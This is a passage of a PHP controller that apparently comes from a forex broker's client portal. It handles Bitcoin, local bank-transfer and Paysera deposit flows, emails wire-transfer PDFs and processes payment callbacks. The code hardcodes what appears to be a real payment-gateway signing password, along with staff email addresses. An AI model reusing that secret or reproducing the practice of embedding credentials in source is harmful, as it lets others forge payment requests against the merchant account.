                                $message = '<i class="fa fa-exclamation-circle"></i> ['.$WebService->request_status.']';
                        }

                    $insertDepositFailed2 = [
                            'transaction_id	' => $this->input->post('transaction_id', true), // transaction id
                            'reference_id' => $this->input->post('address', true), // forexmart BTC address
                            'status	' => 0,
                            'amount	' => 0,
                            'currency' => $account['mt_currency_base'],
                            'user_id' => $this->session->userdata('user_id'),
                            'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                            'transaction_type' => 'BITCOIN',
                            'payment_status' => $this->paymentType_status['Deposit via Bitcoin'], //FXPP-7618
                            'currency_status' => $isMicro = $this->account_model->isMicro($this->session->userdata('user_id')),
                            'fee' => 0,
                            'isFailed' => 0,
                            'type' => 'deposit',
                            'comment' => $WebService->request_status,
                        ];

                    $this->general_model->insert('no_status_transaction', $insertDepositFailed2);

                    $this->session->set_flashdata('result', ['message' => $message, 'success' => false]);

                    // Sending email to cancelled transaction
                    if ($this->session->userdata('login_type') == 1) {
                        $account_detail = $this->partners_model->getAccountByUserId($this->session->userdata('user_id'));
                        $account_detail['account_number'] = $account_detail['reference_num'];
                    } else {
                        $account_detail = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                    }

                    $details = [
                            'account_number' => $account_detail['account_number'],
                            'type' => 'Bitcoin',
                            'reason' => str_replace('_', ' ', $WebService->request_status),
                        ];
                    $this->sendEmailFailedDeposit($details);

                    //------- FXPP-12707 Start ---------------
                    $sendPending = [
                            'account_number' => $details['account_number'],
                            'time' => $insertDepositFailed2['payment_date'],
                            'payment_type' => 'Bitcoin',
                            'amount' => $insertDepositFailed2['amount'].' '.$insertDepositFailed2['currency'],
                            'transaction_id' => $insertDepositFailed2['transaction_id'],
                        ];

                    if (IPLoc::APIUpgradeDevIP()) {
                        $this->load->library('Fx_mailer');
                        Fx_mailer::pending_deposit_with_issues($sendPending, 'forexmart.tester5@gmail.com');
                        Fx_mailer::pending_deposit_with_issues($sendPending, 'agus@forexmart.com');
//                        Fx_mailer::pending_deposit_with_issues($sendPending, "finance@forexmart.com");
                    }
                    //------- FXPP-12707 End ---------------
                }
//                } else {
//                    $message = '<i class="fa fa-exclamation-circle"></i> ' . $data['CurPendValidation']['TradeErrorMsg'];
//                    $this->session->set_flashdata("result", array('message' => $message, 'success' => false));
//                }
            } else {
                if (validation_errors()) {
                    $message = '<i class="fa fa-exclamation-circle"></i> '.validation_errors();
                    $this->session->set_flashdata('result', ['message' => $message, 'success' => false]);
                }
            }

            $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';

        
            $account = $this->account_model->getAccountNumber($this->session->userdata('user_id'));
            $data['account'] = $account;
            $data['input_account_number'] = FXPP::inputAccountNumberWithBalance2($account['account_number'], $account['currency']);

            
    
            $data['option'] = $this->general_model->selectOptionList(FXPP::getUserAccountCurrencyBase());

            $status = $this->input->get('status');
            if ($status === 'success') {
                $data['success'] = true;
            } else {
                $data['success'] = false;
            }


            $data['account'] = $account;
            $data['account']['currency'] = $this->general_model->getAccountCurrencyBase($account['mt_currency_base']);
            $data['bitcoin_address'] = $this->general_model->getData('bitcoin_address', 'bitcoin_address', ['user_id' => $this->session->userdata('user_id')]);

            $data['account']['currency_new'] = $data['account']['currency'];
            if ($data['account']['currency_new'] == 'RUB') {
                $data['account']['currency_new'] = 'RUR';
            }
            $data['metadata_description'] = 'Provide the necessary information to deposit via Bitcoin. Request is processed within 24 hours.';
            $this->template->title('ForexMart | Deposit - Bitcoin')
                ->set_layout('internal/main')
                ->prepend_metadata("
                    <script src='".$this->template->Js()."custom-deposit.js'></script>
                            ")
                ->build('deposits/bitcoin', $data);
        } else {
            redirect('signout');
        }
    }

    public function generate_bitcoin_address()
    {
        if ($this->input->is_ajax_request() && $this->session->userdata('logged')) {
            $data['bitcoin_address'] = '';
            $bitcoin_address = $this->general_model->getData('bitcoin_address', 'bitcoin_address', ['user_id' => $this->session->userdata('user_id')]);
            if ($bitcoin_address && $bitcoin_address != '') {
                $this->output->set_content_type('application/json')->set_output(json_encode(['address' => $bitcoin_address->bitcoin_address]));
            } else {
                $webservice_config = [
                    'server' => 'bitcoin',
                ];
                $WebService = new WebService($webservice_config);
                $WebService->request_payment_address();
                $payment_address = '';

                if ($WebService->request_status === 'REQUEST_OK') {
                    $payment_address = $WebService->get_result('Address');

                    $table = 'bitcoin_address';
                    $info = [
                        'bitcoin_address' => $payment_address,
                        'user_id' => $this->session->userdata('user_id'),
                        'date_added' => date('Y-m-d H:i:s'),
                    ];
                    $this->general_model->insert($table, $info);
                }

                $this->output->set_content_type('application/json')->set_output(json_encode(['address' => $payment_address]));
            }
        }
    }

//    public function paysera() {
//        if ($this->session->userdata('logged')) {
//
//            FXPP::LoginTypeRestriction();
//
//            $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
//            $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));
//
//            $data['user_status'] = $user_status;
//
//            if ($user_status) {
//                if ($data['incomplete']) {
//                    $disabled = '';
//                } else {
//                    $disabled = 'disabled';
//                }
//            } else {
//                $disabled = 'disabled';
//            }
//
//            if (isset($_SESSION['paysera_start'])) {
//                switch ($_SESSION['paysera_start']) {
//                    case 0://post
//                        $data['prompt'] = 'Transaction has been cancelled.';
//                        break;
//                    case 1://cancel
//                        $data['prompt'] = 'Transaction has been cancelled.';
//                        break;
//                }
//                unset($_SESSION['paysera_start']);
//
//                // Sending email to cancelled transaction
//                if ($_SESSION['user_id'] == 54179) {
//                    if (isset($data['prompt']) && $data['prompt'] == 'Transaction has been cancelled.') {
//                        $account_detail = $this->account_model->getAccountByUserId($_SESSION['user_id']);
//                        $details = array(
//                            'account_number' => $account_detail['account_number'],
//                            'type' => 'PaySera',
//                            'reason' => 'CANCELLED',
//                        );
//                        $this->sendEmailFailedDeposit($details);
//                    }
//                }
//            }
//
//            $data['disabled'] = $disabled;
//
//            $account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
//            $data['account'] = $account;
//            $data['account']['currency'] = $this->general_model->getAccountCurrencyBase($account['mt_currency_base']);
//
//            $js = $this->template->Js();
//            $data['metadata_description'] = 'Provide the necessary information to deposit via Paysera.';
//            $this->template->title("ForexMart | Deposit - Paysera")
//                ->set_layout('internal/main')
//                ->prepend_metadata("
//                        <script src='" . $js . "custom-deposit.js'></script>
//                            ")
//                ->build('deposits/paysera', $data);
//        } else {
//            redirect('signout');
//        }
//    }

    public function debit_credit_cards()
    {
        if ($this->session->userdata('logged')) {
//            if(!FXPP::isPayomaUser()){
//                redirect(FXPP::loc_url('deposit')); //FXMAIN-173
//                show_404('accessing');
//            }
//            // FXPP-10307 Disallow some clients from certain countries from seeing the deposit via Payoma option
//            if(FXPP::notAllowedPayomaDepositCountry()){
//                show_404('accessing');
//            }

            if (!FXPP::isPayomaPayMentAvailable()) {
                redirect(FXPP::loc_url('deposit')); //FXPP-13573
            }

            $account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));

            $data['modal_currency_cardpay'] = $this->load->ext_view('modal', 'cardpay_alert', null, true);
            $data['currency'] = $account['mt_currency_base'];
            $data['amount'] = $this->input->post_get('amount1', true);

            $this->template->title('ForexMart | Deposit - Debit/Credit Cards')
                ->set_layout('internal/main')
                ->append_metadata_css("
                       <link rel='stylesheet' href='".$this->template->Css()."deposit.css'>
                 ")
                ->build('deposits/choose_debit_credit_cards', $data);
        } else {
            redirect('signout');
        }
    }

    public function idr_local_bank_transfer()
    {
        if ($this->session->userdata('logged')) {
            if (IPLoc::Office() || FXPP::isIndonesianCountry() || IPLoc::VPN_IP_Jenalie()) {
                $account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                $data['currency'] = $account['mt_currency_base'];
                $data['amount'] = $this->input->post_get('amount1', true);

                $this->template->title('ForexMart | Deposit - Bank transfer in IDR')
                ->set_layout('internal/main')
                ->append_metadata_css("
                       <link rel='stylesheet' href='".$this->template->Css()."deposit.css'>
                 ")
                ->build('deposits/choose_bank_transfer_idr', $data);
            } else {
                redirect(FXPP::loc_url('deposit'));
            }
        } else {
            redirect('signout');
        }
    }

    public function myr_local_bank_transfer()
    {
        if ($this->session->userdata('logged')) {
            if (IPLoc::Office() || FXPP::isMalaysianCountry()) {
                $account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                $data['currency'] = $account['mt_currency_base'];
                $data['amount'] = $this->input->post_get('amount1', true);

                $this->template->title('ForexMart | Deposit - Bank transfer in MYR')
                ->set_layout('internal/main')
                ->append_metadata_css("
                       <link rel='stylesheet' href='".$this->template->Css()."deposit.css'>
                 ")
                ->build('deposits/choose_bank_transfer_myr', $data);
            } else {
                redirect(FXPP::loc_url('deposit'));
            }
        } else {
            redirect('signout');
        }
    }

    public function thb_local_bank_transfer()
    {
        if ($this->session->userdata('logged')) {
            if (IPLoc::Office() || FXPP::isThailandCountry()) {
                $account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                $data['currency'] = $account['mt_currency_base'];
                $data['amount'] = $this->input->post_get('amount1', true);

                $this->template->title('ForexMart | Deposit - Bank transfer in THB')
                ->set_layout('internal/main')
                ->append_metadata_css("
                       <link rel='stylesheet' href='".$this->template->Css()."deposit.css'>
                 ")
                ->build('deposits/choose_bank_transfer_thb', $data);
            } else {
                redirect(FXPP::loc_url('deposit'));
            }
        } else {
            redirect('signout');
        }
    }

    public function vnd_local_bank_transfer()
    {
        if ($this->session->userdata('logged')) {
            if (IPLoc::Office() || FXPP::isVietnamCountry()) {
                $account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                $data['currency'] = $account['mt_currency_base'];
                $data['amount'] = $this->input->post_get('amount1', true);

                $this->template->title('ForexMart | Deposit - Bank transfer in VND')
                ->set_layout('internal/main')
                ->append_metadata_css("
                       <link rel='stylesheet' href='".$this->template->Css()."deposit.css'>
                 ")
                ->build('deposits/choose_bank_transfer_vnd', $data);
            } else {
                redirect(FXPP::loc_url('deposit'));
            }
        } else {
            redirect('signout');
        }
    }

    public function bankTransfer()
    {
        if (!FXPP::isEUUrl()) {
            //show_404('accessing');
            //https://www.forexmart.com/deposit-withdraw-page
            redirect(FXPP::www_url('deposit-withdraw-page'));
        }
        //redirect(FXPP::loc_url('deposit'));
        if ($this->session->userdata('logged')) {
            // if (!IPLoc::Office()) {
            //     FXPP::LoginTypeRestriction();
            // }

            if ($this->isPartner) {
                $user_status = $this->partners_model->getAccountStatus($this->session->userdata('user_id'));
                $data['incomplete'] = true;
            } else {
                $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
                $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));
            }
            $data['error_msg'] = $this->updated_deposit_validation($this->session->userdata('user_id'));
            $data['count_status'] = $this->general_model->getCountVerifyStatus($this->session->userdata('user_id')); //joy deposit FXPP-6768

            // $data['user_status'] = $user_status;
            $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
            $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';

            /* if ($this->isPartner) {
                $account = $this->partners_model->getAccountByUserId($this->session->userdata('user_id'));
                $currency_base = $account['currency'];
            } else {
                $account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                $currency_base = $account['mt_currency_base'];
            }*/

            if ($this->session->userdata('login_type') == 1) {
                $account = $this->account_model->getAccountByPartnerId2($this->session->userdata('user_id'));
                $currency_base = $account['currency'];
            } else {
                $account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                $currency_base = $account['mt_currency_base'];
            }

            $this->load->model('Bank_transfer_model');
            $account_last_digit = substr($account['account_number'], -1);

            switch ((int) $account_last_digit) {
                case 1:
                case 2:
                case 3:
                case 4:
                case 5:
                case 6:
                case 7:
                case 8:
                case 9:
                case 0:
                    $bank_id = 5;
                    break;
//                case 9:
//                case 0:
//                    $bank_id = 5;
//                    break;
            }
            $data['amount'] = $this->input->post_get('amount1', true);
            $data['account'] = $account;
            $data['account']['currency'] = $this->general_model->getAccountCurrencyBase($currency_base);
            $data['account']['currency_new'] = $data['account']['currency'];
            if ($data['account']['currency_new'] == 'RUB') {
                $data['account']['currency_new'] = 'RUR';
            }

            $bank_details = $this->Bank_transfer_model->getBankById($bank_id);
            $bank_account_details = $this->Bank_transfer_model->getBankAccountByBankCurrency($bank_id, $currency_base);
            $data['account_name'] = $bank_details['account_name'];
            $data['bank_name'] = $bank_details['bank_name'];
            $data['bank_address'] = $bank_details['bank_address'];
            $data['bank_swift'] = $bank_details['swift'];
            $data['bank_beneficiary_address'] = $bank_details['beneficiary_address'];
            $data['bank_account_number'] = $bank_account_details['account'];
            $data['bank_iban'] = $bank_account_details['iban'];
            $data['metadata_description'] = 'Once you have provided the required data, you will receive a bank transfer form by email.';
            $js = $this->template->Js();
            $this->template->title('ForexMart | Deposit - Bank Transfer')
                ->set_layout('internal/main')
                ->prepend_metadata("
                    <script src='".$js."custom-deposit.js'></script>
                            ")
                ->build('deposits/bank_transfer', $data);
        } else {
            redirect('signout');
        }
    }

    public function bank_wire_transfer()
    {
        if ($this->session->userdata('logged')) {
            redirect('deposit');

            $account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));

            $data['modal_currency_cardpay'] = $this->load->ext_view('modal', 'cardpay_alert', null, true);
            $data['currency'] = $account['mt_currency_base'];
            $data['amount'] = $this->input->post_get('amount1', true);

            $this->template->title('ForexMart | Deposit - Bank Transfer')
                ->set_layout('internal/main')
                ->append_metadata_css("
                       <link rel='stylesheet' href='".$this->template->Css()."deposit.css'>
                 ")
                ->build('deposits/choose_bank_transfer', $data);
        } else {
            redirect('signout');
        }
    }

    public function bank_transfer()
    {
        if (!IPLoc::Office()) {
            show_404('accessing');
        }
        //if(!FXPP::isEUUrl()){show_404('accessing'); }
        if ($this->session->userdata('logged')) {
//            if (!IPLoc::Office()) {
//                FXPP::LoginTypeRestriction();
//            }

            if ($this->isPartner) {
                $user_status = $this->partners_model->getAccountStatus($this->session->userdata('user_id'));
                $data['incomplete'] = true;
            } else {
                $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
                $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));
            }

            // $data['user_status'] = $user_status;
            $data['error_msg'] = $this->updated_deposit_validation($this->session->userdata('user_id'));
            $data['count_status'] = $this->general_model->getCountVerifyStatus($this->session->userdata('user_id')); //joy deposit FXPP-6768
            $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
            $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';

            /*  if ($this->isPartner) {
                $account = $this->partners_model->getAccountByUserId($this->session->userdata('user_id'));
                $currency_base = $account['currency'];
            } else {
                $account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                $currency_base = $account['mt_currency_base'];
            }*/

            if ($this->session->userdata('login_type') == 1) {
                $account = $this->account_model->getAccountByPartnerId2($this->session->userdata('user_id'));
                $currency_base = $account['currency'];
            } else {
                $account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                $currency_base = $account['mt_currency_base'];
            }

            $this->load->model('Bank_transfer_model');
            $account_last_digit = substr($account['account_number'], -1);

            switch ((int) $account_last_digit) {
                case 1:
                case 2:
                case 3:
                case 4:
                case 5:
                case 6:
                case 7:
                case 8:
                case 9:
                case 0:
                    $bank_id = 5;
                    break;
//                case 9:
//                case 0:
//                    $bank_id = 5;
//                    break;
            }

            $data['account'] = $account;
            $data['account']['currency'] = $this->general_model->getAccountCurrencyBase($currency_base);
            $data['account']['currency_new'] = $data['account']['currency'];
            if ($data['account']['currency_new'] == 'RUB') {
                $data['account']['currency_new'] = 'RUR';
            }
            $bank_details = $this->Bank_transfer_model->getBankById($bank_id);
            $bank_account_details = $this->Bank_transfer_model->getBankAccountByBankCurrency($bank_id, $currency_base);
            $data['account_name'] = $bank_details['account_name'];
            $data['bank_name'] = $bank_details['bank_name'];
            $data['bank_address'] = $bank_details['bank_address'];
            $data['bank_swift'] = $bank_details['swift'];
            $data['bank_beneficiary_address'] = $bank_details['beneficiary_address'];
            $data['bank_account_number'] = $bank_account_details['account'];
            $data['bank_iban'] = $bank_account_details['iban'];
            $data['metadata_description'] = 'Once you have provided the required data, you will receive a bank transfer form by email.';
            $js = $this->template->Js();
            $this->template->title('ForexMart | Deposit - Bank Transfer')
                ->set_layout('internal/main')
                ->prepend_metadata("
                    <script src='".$js."custom-deposit.js'></script>
                            ")
                ->build('deposits/bank_transfer', $data);
        } else {
            redirect('signout');
        }
    }

    public function sendBankTransfer()
    {
        if ($this->input->is_ajax_request() && $this->session->userdata('logged')) {
            $this->load->model('user_model');
            $user_id = $this->session->userdata('user_id');
            $bank_name = $this->input->post('bank_name', true);
            $bank_amount = $this->input->post('bank_amount', true);
            $bank_currency = $this->input->post('currency', true);
            $bonus = $this->input->post('bonus', true);
            $this->form_validation->set_rules('bank_name', 'Your Bank\'s Name', 'trim|required|xss_clean');
            $this->form_validation->set_rules('bank_amount', 'Deposit Amount', "trim|numeric|required|xss_clean|deposit_min_amount[$bank_currency]");
            $this->form_validation->set_rules('currency', 'Currency', 'trim|required|xss_clean');

            /* FXPP-6333
            $isMicro = $this->account_model->isMicro($user_id);
            if($isMicro){
                $bank_amount /= 100;
            }
             FXPP-6333 */

            $currencyStatus = $this->currency_status[$bank_currency];
            $isMicro = $this->account_model->isMicro($user_id);
            if ($isMicro) {
                $currencyStatus = $this->currency_status['Cents'];
            }

            //Validation for NDB accounts with Bonus Profit
//            $ndb_status = $this->withdraw_model->hasCancelledNDBbonus($this->session->userdata('user_id'));
//            $hasInNdbBonus = $this->NodepositBonusValidation($this->session->userdata('user_id'), 2);
//            if ($hasInNdbBonus == 2) { //has Ndb Bonus
//                $data['CurPendValidation'] = $this->CurrentAndPendingTradesValidation();//returns false if no open trades
//            }

            if ($this->form_validation->run()) {
                // if (!$data['CurPendValidation']['TradeError'] || $ndb_status) { //FXPP-5960
                if ($bank_amount > 0) {
                    $note = $this->input->post('note', true);
                    $date_now = date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime()));
                    $this->load->model('Bank_transfer_model');

                    $current_user_profile = $this->user_model->getUserProfileByUserId($user_id);

                    if ($this->isPartner) {
                        $account = $this->partners_model->getAccountByUserId($this->session->userdata('user_id'));
                        $account['account_number'] = $account['reference_num'];
                        $currency_base = $account['currency'];
                    } else {
                        $account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                        $currency_base = $account['mt_currency_base'];
                    }

                    $account_last_digit = substr($account['account_number'], -1);

                    switch ((int) $account_last_digit) {
                            case 1:
                            case 2:
                            case 3:
                            case 4:
                            case 5:
                            case 6:
                            case 7:
                            case 8:
                                $bank_id = 1;
                                break;
                            case 9:
                            case 0:
                                $bank_id = 5;
                                break;
                        }

//            $bank_account_number = $this->bank_transfer_accounts[$bank_currency];
//            $bank_account_iban = $this->bank_transfer_iban[$bank_currency];
                    $bank_details = $this->Bank_transfer_model->getBankById($bank_id);
                    $bank_account_details = $this->Bank_transfer_model->getBankAccountByBankCurrency($bank_id, $currency_base);

                    $data = [
                            'full_name' => $current_user_profile['full_name'],
                            'date_now' => $date_now,
                            'amount' => $bank_amount,
                            'currency' => $bank_currency,
                            'email' => $current_user_profile['email'],
                            'bank_name' => $bank_name,
                            'bank_account_number' => $bank_account_details['account'],
                            'bank_iban' => $bank_account_details['iban'],
                            'account_number' => $account['account_number'],
                            'beneficiary_account_name' => $bank_details['account_name'],
                            'beneficiary_bank_name' => $bank_details['bank_name'],
                            'beneficiary_bank_address' => $bank_details['bank_address'],
                            'beneficiary_swift' => $bank_details['swift'],
                        ];

                    if ($bank_id == 3) {
                        $data['bank_id'] = 3;
                        $data['comment'] = 'USD49863920 Acc: '.$account['account_number'];
                    }

                    if ($bank_id == 2) {
                        $data['bank_id'] = 2;
                        switch ($bank_currency) {
                                case 'EUR':
                                    $data['comment'] = 'wallet EUR77642465 Acc: '.$account['account_number'];
                                    break;
                                case 'GBP':
                                    $data['comment'] = 'wallet GBP25667946 Acc: '.$account['account_number'];
                                    break;
                                case 'USD':
                                    $data['comment'] = 'wallet USD49863920 Acc: '.$account['account_number'];
                                    break;
                                default:
                                    $data['comment'] = '';
                                    break;
                            }
                    }

                    $subject = 'ForexMart Bank Transfer';
                    $config = [
                            'mailtype' => 'html',
                        ];
                    
                    $user_docs_file=$this->config->item('asset_user_docs');
                    
                    $this->load->library('PDFWriter');
                    $FPDF = new PDFWriter();
                    $file_path = $_SERVER['DOCUMENT_ROOT'].$user_docs_file;
                    $file_name = 'bank-transfer_'.$account['account_number'].'.pdf';
                    $FPDF->generateBankTransferPDF($file_path, $file_name, $data);
                   
                    
                    $this->general_model->sendEmailAttachment('bank-transfer-html', $subject, $data['email'], $data, $config, $user_docs_file.'bank-transfer_'.$account['account_number'].'.pdf', 'bank-transfer.pdf');

                    $bank_details = [
                            'beneficiary_bank_name' => $bank_details['bank_name'],
                            'beneficiary_address' => $bank_details['bank_address'],
                            'beneficiary_swift' => $bank_details['swift'],
                            'beneficiary_account' => $bank_details['account_name'],
                            'bank_name' => $bank_name,
                            'account_number' => $account['account_number'],
                            'date_request' => date('Y-m-d H:i:s', strtotime($date_now)),
                        ];

                    $this->general_model->insertmy('bank_transfer_request', $bank_details);

                    $date = new DateTime();
                    $order_number = $date->getTimestamp();
                    $conv_amount = $this->get_convert_amount($bank_currency, $bank_amount);
                    $data = [
                            'transaction_id' => 0,
                            'reference_id' => $order_number,
                            'status' => 0,
                            'amount' => $bank_amount,
                            'currency' => $bank_currency,
                            'user_id' => $user_id,
                            'payment_date' => date('Y-m-d H:i:s', strtotime($date_now)),
                            'date_request' => date('Y-m-d H:i:s', strtotime($date_now)),
                            'note' => $note,
                            'transaction_type' => 'BANK TRANSFER',
                            'conv_amount' => $conv_amount,
                            'payment_status' => $this->paymentType_status['Deposit via Bank Transfer'], //FXPP-7618
                            'currency_status' => $currencyStatus, //FXPP-7618
                        ];

                    if ($bonus == 'tenpb') {
                        $data['tenpercentbonus'] = '1';
                    }

                    if ($bonus == 'twpb') {
                        $data['twentypercentbonus'] = '1';
                    }

                    if ($bonus == 'tpb') {
                        $data['thirtypercentbonus'] = '1';
                    }
                    if ($bonus == 'fpb') {
                        $data['fiftypercentbonus'] = '1';
                    }
                    if ($bonus == 'hpb') {
                        $data['hundredpercentbonus'] = '1';
                    }
                    $this->deposit_model->insertPayment($data);

                    $data_html = '<div class="col-lg-12 col-centered" style="margin-top: 20px">
                            <div class="alert alert-success" role="alert">Thank you for your request. We have sent you a "Wire Transfer Form" which contains all the details your bank will require in order to send funds to your ForexMart Account. Please check your email. You may also click on the button below.</div>
                                <a href="'.base_url('deposit/downloadBankTransferPDF').'" download>
                                    <button type="button" class="btn-download">Download Wire Transfer Form</button>
                                </a>
                            </div>';

                    $this->output->set_content_type('application/json')->set_output(json_encode(['success' => true, 'data' => $data_html]));
                } else {
//                    $data_html = '<div class="form-group">
//                                <div class="col-sm-12">
//                                    <div class="alert alert-danger" role="alert">
//                                        Amount must be greater than 0.
//                                    </div>
//                                </div>
//                            </div>';
                    $errMsg = 'Amount must be greater than 0.';
                    $this->output->set_content_type('application/json')->set_output(json_encode(['success' => false, 'Errdata' => $errMsg]));
                    // $this->output->set_content_type('application/json')->set_output(json_encode(array('success' => false, 'data' => $data_html)));
                }
//                } else {
//                    $this->output->set_content_type('application/json')->set_output(json_encode(array('success' => false, 'Errdata' => $data['CurPendValidation']['TradeErrorMsg'])));
//                    // $this->output->set_content_type('application/json')->set_output(json_encode(array('success' => false, 'data' => $data_html)));
//                }
            } else {
                $errMsg = validation_errors();
                $this->output->set_content_type('application/json')->set_output(json_encode(['success' => false, 'Errdata' => $errMsg]));
                // $this->output->set_content_type('application/json')->set_output(json_encode(array('success' => false, 'data' => $data_html)));
            }
        } else {
            show_404();
        }
    }

    public function downloadBankTransferPDF()
    {
        if ($this->session->userdata('logged')) {
            header('Content-type:application/pdf');
            header("Content-Disposition:attachment;filename='bank-transfer.pdf'");
            $user_id = $this->session->userdata('user_id');
            $account = $this->account_model->getAccountByUserId($user_id);
            
            $user_docs_file=$this->config->item('asset_user_docs');
            
            readfile($user_docs_file.'bank-transfer_'.$account['account_number'].'.pdf');
            //file_put_contents( $path, $pdf_data );
        }
    }

    public function webtopay()
    {
        if ($this->input->is_ajax_request()) {
            $this->load->library('WebToPay');
            $date = new DateTime();
            $order_number = $date->getTimestamp();
            $amount = number_format($this->input->post('amount', true), 2);
            $account_id = $this->input->post('account_currency', true);
            $account_info = $this->account_model->get_account_by_id($account_id);
            $currency = $account_info['mt_currency_base'];
            $email = $this->input->post('email', true);

            /* FXPP-6333
            $isMicro = $this->account_model->isMicro($account_info['user_id']);
            if($isMicro){
                $amount /= 100;
            }
             FXPP-6333 */

            try {
                $request = WebToPay::buildRequest([
                    'projectid' => 71720,
                    'sign_password' => 'cda72177eba360ff16b7f836e2754370',
                    'orderid' => $order_number,
                    'amount' => $amount * 100,
                    'currency' => $currency,
                    'p_email' => $email,
                    'country' => 'US',
                    'lang' => 'ENG',
                    'paytext' => 'ForexMart Payment Deposit',
                    'accepturl' => 'https://my.forexmart.com/deposit',
                    'cancelurl' => 'https://my.forexmart.com/deposit/webmoney',
                    'callbackurl' => 'https://my.forexmart.com/deposit/webmoneyNotification',
                    'user_id' => $this->session->userdata('user_id'),
                    'account_number' => $account_info['account_number'],
//                    'test'          => 1,
                ]);
                $action = WebToPay::PAY_URL;
                $data = '';
                foreach ($request as $key => $val) {
                    $data_value = get_magic_quotes_gpc() ? $val : addslashes($val);
                    $data .= '<input type="hidden" name="'.$key.'" value="'.$data_value.'" />';
                }

                $this->output->set_content_type('application/json')->set_output(json_encode(['action' => $action, 'data' => $data, 'amount' => $amount]));
            } catch (WebToPayException $e) {
                echo $e->getMessage();
                show_404();
            }
        } else {
            show_404();
        }
    }

    public function payseratopay()
    {
        if ($this->input->is_ajax_request()) {
            $this->load->library('WebToPay');
            $date = new DateTime();
            $order_number = $date->getTimestamp();
            $amount = number_format($this->input->post('amount', true), 2);
            $account_id = $this->input->post('account_currency', true);
            $account_info = $this->account_model->get_account_by_id($account_id);
            $currency = $account_info['mt_currency_base'];
            $email = $this->input->post('email', true);

            /* FXPP-6333
            $isMicro = $this->account_model->isMicro($account_info['user_id']);
            if($isMicro){
                $amount /= 100;
            }
             FXPP-6333 */

            try {
                $request = WebToPay::buildRequest([
                    'projectid' => 71720,
                    'sign_password' => 'cda72177eba360ff16b7f836e2754370',
                    'orderid' => $order_number,
                    'amount' => $amount * 100,
                    'currency' => $currency,
                    'p_email' => $email,
                    'country' => 'US',
                    'lang' => 'ENG',
                    'paytext' => 'ForexMart Payment Deposit',
                    'accepturl' => 'https://my.forexmart.com/deposit',
                    'cancelurl' => $this->session->userdata('user_id') == 54179 ? 'https://my.forexmart.com/deposit/paysera-canceled' : 'https://my.forexmart.com/deposit/paysera',
                    'callbackurl' => 'https://my.forexmart.com/deposit/payseraNotification',
                    'user_id' => $this->session->userdata('user_id'),
                    'account_number' => $account_info['account_number'],
//                    'test'          => 1,
                ]);
                $action = WebToPay::PAY_URL;
                $data = '';
                foreach ($request as $key => $val) {
                    $data_value = get_magic_quotes_gpc() ? $val : addslashes($val);
                    $data .= '<input type="hidden" name="'.$key.'" value="'.$data_value.'" />';
                }

                $this->output->set_content_type('application/json')->set_output(json_encode(['action' => $action, 'data' => $data, 'amount' => $amount]));
            } catch (WebToPayException $e) {
                echo $e->getMessage();
                show_404();
            }
        } else {
            show_404();
        }
    }

    public function paysera_canceled()
    {
        $data['paysera_session'] = [
            'paysera_start' => 1,
        ];
        $this->session->set_userdata($data['paysera_session']);
        redirect(FXPP::loc_url('deposit/paysera'));
    }

    public function payseraNotification()
    {
        $this->load->library('WebToPay');
        $log = '';
        try {
            $response = WebToPay::checkResponse($_GET, [
                'projectid' => 71720,
                'sign_password' => 'cda72177eba360ff16b7f836e2754370',
            ]);

//            if ($response['test'] !== '0') {
//                throw new Exception('Testing, real payment was not made');
//            }
//            if ($response['type'] !== 'macro') {
//                throw new Exception('Only macro payment callbacks are accepted');
//            }
            $date = new DateTime();
            $order_number = $date->getTimestamp();
            $status = $response['status'];
            $amount = $response['amount'] / 100;
            $currency = $response['currency'];
            $conv_amount = $this->get_convert_amount($currency, $amount);

            $data = [
                'transaction_id' => $response['orderid'],
                'reference_id' => $order_number,
                'status' => $this->paysera_status[$status],
                'amount' => $amount,
                'currency' => $response['currency'],
                'user_id' => $response['user_id'],
                'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                'note' => $response['paytext'],
                'transaction_type' => 'WEBMONEY',
                'conv_amount' => $conv_amount,
            ];

            if ($status == 1) {
                $config = [
                    'server' => 'live_new',
                ];
//                $WebService = new WebService($config);
                $account_number = $response['account_number'];

//                if (IPLoc::APIUpgradeDevIP()) {
                    $WebServiceNew = FXPP::DepositRealFund($account_number, $amount, $this->comment_type['deposit'].$this->comment_transaction_type['WEBMONEY'].$data['transaction_id']);
                    $requestResult = $WebServiceNew['requestResult'];
//                } else {
//                    $WebService->update_live_deposit_balance($account_number, $amount, $this->comment_type['deposit'].$this->comment_transaction_type['WEBMONEY'].$data['transaction_id']);
//                    $requestResult = $WebService->request_status;
//                }

                if ($requestResult === 'RET_OK') {
                    // Back Agent of Client
                   // FXPP::BackAgentOfAccount($account_number);

                    $WebService2 = new WebService($config);
                    $WebService2->request_live_account_balance($account_number);
                    if ($WebService2->request_status === 'RET_OK') {
                        $balance = $WebService2->get_result('Balance');
                        $this->account_model->updateAccountBalance($account_number, $balance);
                        //FXPP::extraCommission($account_number,$amount, $data['transaction_id']);  // Exatra commission update
                    }
                }
            } elseif ($status == 2) {
